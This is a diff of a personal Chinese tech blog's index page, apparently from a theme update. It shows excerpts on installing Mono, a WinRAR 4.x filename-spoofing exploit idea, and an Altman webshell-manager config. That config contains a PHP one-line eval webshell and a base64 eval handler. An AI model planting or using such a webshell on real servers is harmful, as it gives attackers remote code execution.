+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/howto/" itemprop="url" rel="index">
+                    <span itemprop="name">howto</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/howto/osx-installed-mono-environment/">
-                Mac安装mono环境
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/howto/osx-installed-mono-environment/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/osx-installed-mono-environment/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
-      
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2014-07-25
-        </span>
-
-        
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
-            
-              <a href="/categories/howto/">howto</a>
-
-              
-              
-
-            
-          </span>
-        
-
-        
           
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/howto/osx-installed-mono-environment/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/osx-installed-mono-environment/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
-    </div>
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -476,7 +797,7 @@
 </ol>
 <p>然后默认安装即可。</p>
           <div class="post-more-link text-center">
-            <a class="btn" href="/howto/osx-installed-mono-environment/#more">
+            <a class="btn" href="/howto/osx-installed-mono-environment/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -484,7 +805,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -493,60 +814,82 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/technology/altman-connects-phpEval-and-phpAssert-shell/" itemprop="url">
+                  Altman连接phpEval与phpAssert一句话木马
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-07-10T00:00:00+08:00" content="2014-07-10">
+              2014-07-10
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/technology/" itemprop="url" rel="index">
+                    <span itemprop="name">technology</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/technology/altman-connects-phpEval-and-phpAssert-shell/">
-                Altman连接phpEval与phpAssert一句话木马
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/technology/altman-connects-phpEval-and-phpAssert-shell/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/altman-connects-phpEval-and-phpAssert-shell/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
-      
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2014-07-10
-        </span>
-
-        
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
-            
-              <a href="/categories/technology/">technology</a>
-
-              
-              
-
-            
-          </span>
-        
-
-        
           
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/technology/altman-connects-phpEval-and-phpAssert-shell/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/altman-connects-phpEval-and-phpAssert-shell/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
-    </div>
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -559,7 +902,7 @@
 <p>Altman连接phpEval一句话木马的时候，phpEval.type的定义如下：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">customShellType</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">basicSetting</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">name</span>&gt;</span>phpEval<span class="tag">&lt;/<span class="title">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">serviceExample</span>&gt;</span><span class="cdata">&lt;![CDATA[&lt;?php @eval($_POST[a])?&gt;]]&gt;</span><span class="tag">&lt;/<span class="title">serviceExample</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">mainCodeParam</span> <span class="attribute">location</span>=<span class="value">"Body"</span> <span class="attribute">encrymode</span>=<span class="value">"None"</span> &gt;</span>passwd<span class="tag">&lt;/<span class="title">mainCodeParam</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">basicSetting</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">mainCodeSetting</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">funcCodeParam</span> <span class="attribute">location</span>=<span class="value">"Body"</span> <span class="attribute">encrymode</span>=<span class="value">"Base64"</span> &gt;</span>funcCode<span class="tag">&lt;/<span class="title">funcCodeParam</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">item</span>&gt;</span><span class="cdata">&lt;![CDATA[print("-&gt;|");</span><br><span class="line">eval(base64_decode($_POST[$funcCode$]));</span><br><span class="line">print("|&lt;-");</span><br><span class="line">die();]]&gt;</span><span class="tag">&lt;/<span class="title">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">mainCodeSetting</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">customShellType</span>&gt;</span></span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
-            <a class="btn" href="/technology/altman-connects-phpEval-and-phpAssert-shell/#more">
+            <a class="btn" href="/technology/altman-connects-phpEval-and-phpAssert-shell/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -567,7 +910,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -576,60 +919,82 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/technology/file-spoofing-vulnerability-winrar4-x-scripting/" itemprop="url">
+                  Winrar4.x的文件欺骗漏洞利用脚本
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-03-31T00:00:00+08:00" content="2014-03-31">
+              2014-03-31
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/technology/" itemprop="url" rel="index">
+                    <span itemprop="name">technology</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/technology/file-spoofing-vulnerability-winrar4-x-scripting/">
-                Winrar4.x的文件欺骗漏洞利用脚本
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/technology/file-spoofing-vulnerability-winrar4-x-scripting/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/file-spoofing-vulnerability-winrar4-x-scripting/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
-      
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2014-03-31
-        </span>
-
-        
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
-            
-              <a href="/categories/technology/">technology</a>
-
-              
-              
-
-            
-          </span>
-        
-
-        
           
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/technology/file-spoofing-vulnerability-winrar4-x-scripting/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="technology/file-spoofing-vulnerability-winrar4-x-scripting/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
-    </div>
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -644,7 +1009,7 @@
 <p>这会造成什么结果呢？当第一个filename为readme.exe，第二个filename为readme.txt时，用winrar4.x打开时，你在程序窗口看到的文件名为readme.txt，然后你再点击文件时却是以readme.exe方式打开，这就形成漏洞了。</p>
 <p>文章给出了如何利用这个bug的方法，更改filename2即可。但是作者是手动操作的，那么能不能写成利用脚本呢？这个filename2的长度有没有要求，需不需要和filename1长度相同？这正是本文要研究的。</p>
           <div class="post-more-link text-center">
-            <a class="btn" href="/technology/file-spoofing-vulnerability-winrar4-x-scripting/#more">
+            <a class="btn" href="/technology/file-spoofing-vulnerability-winrar4-x-scripting/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -652,7 +1017,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -661,60 +1026,82 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/howto/ubuntu-installed-mono-environment-2/" itemprop="url">
+                  ubuntu安装mono环境(二)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-03-28T00:00:00+08:00" content="2014-03-28">
+              2014-03-28
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/howto/" itemprop="url" rel="index">
+                    <span itemprop="name">howto</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/howto/ubuntu-installed-mono-environment-2/">
-                ubuntu安装mono环境(二)
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/howto/ubuntu-installed-mono-environment-2/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/ubuntu-installed-mono-environment-2/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
-      
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2014-03-28
-        </span>
-
-        
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
-            
-              <a href="/categories/howto/">howto</a>
-
-              
-              
-
-            
-          </span>
-        
-
-        
           
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/howto/ubuntu-installed-mono-environment-2/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/ubuntu-installed-mono-environment-2/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
-    </div>
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -726,7 +1113,7 @@
           <p>接上篇，上篇仅安装了Mono本身，并没有安装libgdiplus、gtk-sharp、mod_mono、MonoDevelop 等其他相关的软件。<br>这篇主要是配置安装libgdiplus。</p>
 <h2 id="0×00准备工作">0×00准备工作</h2><p>先在VS2012上编译一个winform，代码如下：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">FormsTest</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"><span class="xmlDocTag">///</span> <span class="xmlDocTag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xmlDocTag">///</span> 应用程序的主入口点。</span></span><br><span class="line"><span class="comment"><span class="xmlDocTag">///</span> <span class="xmlDocTag">&lt;/summary&gt;</span></span></span><br><span class="line">[STAThread]</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">Application.EnableVisualStyles();</span><br><span class="line">Application.SetCompatibleTextRenderingDefault(<span class="keyword">false</span>);</span><br><span class="line">Application.Run(<span class="keyword">new</span> Form());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
           <div class="post-more-link text-center">
-            <a class="btn" href="/howto/ubuntu-installed-mono-environment-2/#more">
+            <a class="btn" href="/howto/ubuntu-installed-mono-environment-2/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -734,7 +1121,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -743,60 +1130,82 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
       
 
-  <div class="post post-type-normal ">
-    <div class="post-header">
+  
+  
 
-      
-      
-        <h1 class="post-title">
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/howto/ubuntu-installed-mono-environment-1/" itemprop="url">
+                  ubuntu安装mono环境(一)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-03-28T00:00:00+08:00" content="2014-03-28">
+              2014-03-28
+            </time>
+          </span>
+
           
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/howto/" itemprop="url" rel="index">
+                    <span itemprop="name">howto</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
           
             
-              <a class="post-title-link" href="/howto/ubuntu-installed-mono-environment-1/">
-                ubuntu安装mono环境(一)
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/howto/ubuntu-installed-mono-environment-1/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/ubuntu-installed-mono-environment-1/" itemprop="commentsCount"></span>
               </a>
+            </span>
             
           
-        </h1>
-      
 
-      <div class="post-meta">
-        <span class="post-time">
-          发表于 2014-03-28
-        </span>
-
-        
-          <span class="post-category">
-            &nbsp; | &nbsp; 分类于
-            
-              <a href="/categories/howto/">howto</a>
-
-              
-              
-
-            
-          </span>
-        
-
-        
           
-            <span class="post-comments-count">
-            &nbsp; | &nbsp;
-            <a href="/howto/ubuntu-installed-mono-environment-1/#comments" >
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/ubuntu-installed-mono-environment-1/"></span>
-            </a>
-          </span>
-          
-        
-      </div>
-    </div>
+
+        </div>
+      </header>
+    
+
 
     <div class="post-body">
 
@@ -808,7 +1217,7 @@
           <h2 id="0x00准备工作">0x00准备工作</h2><p>一个全新安装的ubuntu13.10系统</p>
 <h2 id="0×01下载Mono源代码并编译">0×01下载Mono源代码并编译</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line"><span class="constant">Desktop</span> <span class="constant">Downloads</span> <span class="constant">Music</span> <span class="constant">Public</span> <span class="constant">Videos</span></span><br><span class="line"><span class="constant">Documents</span> examples.desktop <span class="constant">Pictures</span> <span class="constant">Templates</span></span><br><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~</span><span class="variable">$ </span>mkdir src</span><br><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~</span><span class="variable">$ </span>cd src</span><br><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~/src</span><span class="variable">$ </span>wget <span class="symbol">http:</span>/<span class="regexp">/download.mono-project.com/sources</span><span class="regexp">/mono/mono</span>-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</span><br><span class="line">--<span class="number">2014</span>-<span class="number">03</span>-<span class="number">27</span> <span class="number">21</span><span class="symbol">:</span><span class="number">24</span><span class="symbol">:</span><span class="number">30</span>-- <span class="symbol">http:</span>/<span class="regexp">/download.mono-project.com/sources</span><span class="regexp">/mono/mono</span>-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</span><br><span class="line"><span class="constant">Resolving</span> download.mono-project.com (download.mono-project.com)... <span class="number">54.240</span>.<span class="number">168.102</span>, <span class="number">54.230</span>.<span class="number">156.158</span>, <span class="number">54.230</span>.<span class="number">157.116</span>, ...</span><br><span class="line"><span class="constant">Connecting</span> to download.mono-project.com (download.mono-project.com)|<span class="number">54.240</span>.<span class="number">168.102</span>|<span class="symbol">:</span><span class="number">80</span>... connected.</span><br><span class="line"><span class="constant">HTTP</span> request sent, awaiting response... <span class="number">200</span> <span class="constant">OK</span></span><br><span class="line"><span class="constant">Length</span><span class="symbol">:</span> <span class="number">77515552</span> (<span class="number">74</span>M) [application/x-bzip2]</span><br><span class="line"><span class="constant">Saving</span> <span class="symbol">to:</span> ‘mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2’</span><br><span class="line"></span><br><span class="line"><span class="number">100</span><span class="string">%[======================================&gt;]</span> <span class="number">77</span>,<span class="number">515</span>,<span class="number">552</span> <span class="number">189</span>K/s <span class="keyword">in</span> <span class="number">10</span>m <span class="number">50</span>s</span><br><span class="line"></span><br><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~/src</span><span class="variable">$ </span>ls</span><br><span class="line">mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</span><br><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~/src</span><span class="variable">$ </span>tar -xjf mono-<span class="number">3.2</span>.<span class="number">8</span>.tar.bz2</span><br><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~/src</span><span class="variable">$ </span>cd mono-<span class="number">3.2</span>.<span class="number">8</span>/</span><br><span class="line">nike<span class="variable">@NIKE</span>-<span class="constant">PC</span><span class="symbol">:~/src/mono-</span><span class="number">3.2</span>.<span class="number">8</span><span class="variable">$ </span>./configure --prefix=<span class="regexp">/opt/mono</span>-<span class="number">3.2</span>.<span class="number">8</span></span><br><span class="line">checking build system type... i686-pc-linux-gnu</span><br><span class="line">checking host system type... i686-pc-linux-gnu</span><br><span class="line">checking target system type... i686-pc-linux-gnu</span><br><span class="line">checking <span class="keyword">for</span> a <span class="constant">BSD</span>-compatible install... /usr/bin/install -c</span><br><span class="line">checking whether build environment is sane... yes</span><br><span class="line">checking <span class="keyword">for</span> a thread-safe mkdir -p... /bin/mkdir -p</span><br><span class="line">checking <span class="keyword">for</span> gawk... no</span><br><span class="line">checking <span class="keyword">for</span> mawk... mawk</span><br><span class="line">checking whether make sets <span class="variable">$(</span><span class="constant">MAKE</span>)... yes</span><br><span class="line">checking how to create a ustar tar archive... gnutar</span><br><span class="line">checking whether to enable maintainer-specific portions of <span class="constant">Makefiles</span>... no</span><br><span class="line">checking whether ln -s works... yes</span><br><span class="line">checking whether make supports nested variables... yes</span><br><span class="line">checking host platform characteristics... ok</span><br><span class="line">checking <span class="keyword">for</span> gcc... gcc</span><br><span class="line">checking <span class="keyword">for</span> gcc... (cached) gcc</span><br><span class="line">checking whether the <span class="constant">C</span> compiler works... yes</span><br><span class="line">checking <span class="keyword">for</span> <span class="constant">C</span> compiler default output file name... a.out</span><br><span class="line">checking <span class="keyword">for</span> suffix of executables...</span><br><span class="line">checking whether we are cross compiling... no</span><br><span class="line">checking <span class="keyword">for</span> suffix of object files... o</span><br><span class="line">checking whether we are using the <span class="constant">GNU</span> <span class="constant">C</span> compiler... yes</span><br><span class="line">checking whether gcc accepts -g... yes</span><br><span class="line">checking <span class="keyword">for</span> gcc option to accept <span class="constant">ISO</span> <span class="constant">C89</span>... none needed</span><br><span class="line">checking <span class="keyword">for</span> style of <span class="keyword">include</span> used by make... <span class="constant">GNU</span></span><br><span class="line">checking dependency style of gcc... gcc3</span><br><span class="line">checking <span class="keyword">for</span> g++... no</span><br><span class="line">checking whether we are using the <span class="constant">GNU</span> <span class="constant">C</span>++ compiler... no</span><br><span class="line">checking whether g++ accepts -g... no</span><br><span class="line">checking dependency style of g++... none</span><br><span class="line">checking dependency style of gcc... gcc3</span><br><span class="line">checking <span class="keyword">for</span> gawk... (cached) mawk</span><br><span class="line">checking whether gcc <span class="keyword">and</span> cc understand -c <span class="keyword">and</span> -o together... yes</span><br><span class="line"><span class="symbol">configure:</span> <span class="symbol">error:</span> <span class="constant">You</span> need to install g++</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
-            <a class="btn" href="/howto/ubuntu-installed-mono-environment-1/#more">
+            <a class="btn" href="/howto/ubuntu-installed-mono-environment-1/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -816,7 +1225,7 @@
       
     </div>
 
-    <div class="post-footer">
+    <footer class="post-footer">
       
 
       
@@ -825,22 +1234,28 @@
       
         <div class="post-eof"></div>
       
-    </div>
-  </div>
+    </footer>
+  </article>
 
 
     
-  </div>
+
+  </section>
 
   
+
 
         </div>
 
         
+
+
+        
+
       </div>
 
-
       
+        
   
   <div class="sidebar-toggle">
     <div class="sidebar-toggle-line-wrap">
@@ -850,21 +1265,23 @@
     </div>
   </div>
 
-  <div id="sidebar" class="sidebar">
+  <aside id="sidebar" class="sidebar">
     <div class="sidebar-inner">
 
       
 
-      <div class="site-overview">
-        <div class="site-author motion-element">
-          <img class="site-author-image" src="https://avatars1.githubusercontent.com/u/7532281?v=3&s=460" alt="keepwn" />
-          <p class="site-author-name">keepwn</p>
+      
+
+      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="https://avatars1.githubusercontent.com/u/7532281?v=3&s=460" alt="keepwn" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">keepwn</p>
         </div>
-        <p class="site-description motion-element">呵呵</p>
-        <div class="site-state motion-element">
+        <p class="site-description motion-element" itemprop="description">呵呵</p>
+        <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-count">9</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -878,12 +1295,12 @@
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-count">17</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
 
-        </div>
+        </nav>
 
         
 
@@ -891,15 +1308,19 @@
           
             
               <span class="links-of-author-item">
-              <a href="https://github.com/keepwn" target="_blank">GitHub</a>
-            </span>
+                <a href="https://github.com/keepwn" target="_blank">
+                  
+                    <i class="fa fa-github"></i> GitHub
+                  
+                </a>
+              </span>
             
           
         </div>
 
         
         
-          <div class="cc-license motion-element">
+          <div class="cc-license motion-element" itemprop="license">
             <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
               <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
             </a>
@@ -909,27 +1330,28 @@
         <div class="links-of-author motion-element">
           
         </div>
-        
-      </div>
+
+      </section>
 
       
 
     </div>
-  </div>
+  </aside>
 
 
-    </div>
+      
+    </main>
 
-    <div id="footer" class="footer">
+    <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">
+        <div class="copyright" >
   
-  &copy; &nbsp;  2014 - 
-  2015
+  &copy;  2014 - 
+  <span itemprop="copyrightYear">2015</span>
   <span class="with-love">
-    <i class="icon-heart"></i>
+    <i class="icon-next-heart fa fa-heart"></i>
   </span>
-  <span class="author">keepwn</span>
+  <span class="author" itemprop="copyrightHolder">keepwn</span>
 </div>
 
 <div class="powered-by">
@@ -946,7 +1368,7 @@
 
 
       </div>
-    </div>
+    </footer>
 
     <div class="back-to-top"></div>
   </div>
@@ -957,37 +1379,8 @@
   
 
   
-  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
-  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
-
-
-  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
-  
-
-  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
-  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
-
-  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
-
-
-
-  <script type="text/javascript" src="/js/search-toggle.js"></script>
-
-  
-
-  <script type="text/javascript">
-    $(document).ready(function () {
-      if (CONFIG.sidebar === 'always') {
-        displaySidebar();
-      }
-    });
-  </script>
-
-  
-
-  
-  
-  
+    
+    
 
   
 
@@ -1011,23 +1404,32 @@
   
 
 
+  
 
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+<script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+<script type="text/javascript" src="/js/motion.js?v=0.4.5.2" id="motion.global"></script>
+
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+
+  <script type="text/javascript" src="/js/bootstrap.js"></script>
 
   
   
-  <script type="text/javascript" src="/js/analytics_google-analytics.js?v=0.4.3"></script>
-
 
   
-  <!-- lazyload -->
-  <script type="text/javascript" src="/js/lazyload.js"></script>
-      <script type="text/javascript">
-        jQuery(function() {          
-            jQuery("#posts img").lazyload({
-              placeholder:"http://www.arao.me/loading.gif",  
-                effect:"fadeIn"
-              });
-            });
-    </script>   
+  
+
 </body>
 </html>
